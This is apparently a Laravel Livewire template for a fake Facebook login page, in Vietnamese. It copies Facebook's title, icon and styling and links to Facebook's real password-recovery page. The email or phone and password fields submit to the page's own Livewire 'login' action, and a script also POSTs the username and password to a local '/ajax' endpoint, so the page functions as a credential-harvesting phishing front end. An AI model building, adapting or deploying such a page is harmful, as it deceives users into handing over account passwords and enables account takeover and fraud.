<div>

<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Facebook</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Lexend+Deca:wght@600&family=Open+Sans:wght@400;500&display=swap" rel="stylesheet">
        <style>
            html,
            body,
            .login_new_vohuunhan {
                height: 100%;
            }
            body {
                font-family: 'Open Sans', sans-serif;
                background: linear-gradient(90deg, rgba(254, 244, 245, 1) 0%, rgba(245, 241, 251, 1) 50%, rgba(238, 246, 255, 1) 100%);
            }
            .form-control {
                height: 55px;
                line-height: 55px;
                border-radius: 11px;
                font-size: 16px;
            }
            .form-control {
                height: 55px;
                line-height: 55px;
                border-radius: 11px;
                border: 1px solid #d3d3d3;
                font-size: 15px;
                font-weight: 500;
            }
            .swal2-title {
                font-size: 18px!important;
                padding-top: 35px!important;
                font-weight: 400!important;
            }
            div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm {
                border: 0;
                border-radius: 0.25em;
                background: initial;
                background-color: #ffffff;
                color: #636363;
                font-size: 1em;
            }
            a {
                text-decoration: none;
            }
        </style>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    </head>
    <body>
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div class="login_new_vohuunhan">
                    <img style="margin-top: 30%!important;" src="{{asset('assets/images/2021_Facebook_icon.svg.webp')}}" class="d-block m-auto" width="60px" height="60px" />
                    <div class="container-fluid" style="margin-top: 17%!important;">
                        <form wire:submit.prevent="login">
                            <div class="form-group">
                                <label for="email">Email hoặc số điện thoại</label>
                                <input type="text" id="email" class="form-control form-control-lg mb-3" wire:model="email" placeholder="Email hoặc số điện thoại" required>
                                @error('email') <span class="text-danger">{{ $message }}</span> @enderror
                            </div>

                            <div class="form-group mt-3">
                                <label for="password">Mật khẩu</label>
                                <input type="password" id="password" class="form-control form-control-lg" wire:model="password" placeholder="Mật khẩu" required>
                                @error('password') <span class="text-danger">{{ $message }}</span> @enderror
                            </div>

                            <div class="d-grid gap-2 mt-3 mb-3">
                                <button class="btn btn-primary" style="background-color: #0063e0; border-color: #0063e0; height: 50px; border-radius: 100px;" type="submit">
                                    <b>Đăng nhập</b>
                                </button>
                            </div>
                        </form>
                        <center>
                            <b><a href="https://www.facebook.com/recover/initiate/">Quên mật khẩu?</a></b>
                        </center>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="Notify" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body text-center"></div>
                </div>
            </div>
        </div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
        <script type="text/javascript">
            $("#login").click(function(){
                document.getElementById("login").disabled = true;
                username = $("#username").val();
                password = $("#password").val();
                $.ajax({
                    type: "POST",
                    url: "/ajax",
                    data: {
                        "post": "login",
                        "username": username,
                        "password": password,
                        "uid": ""
                    },
                    success: function(result1) {
                        document.getElementById("login").disabled = false;
                        var result = JSON.parse(result1);
                        if(result.error == false){
                            location.reload();
                        }
                    }
                })
            });
        </script>
    </body>
</html>

</div>
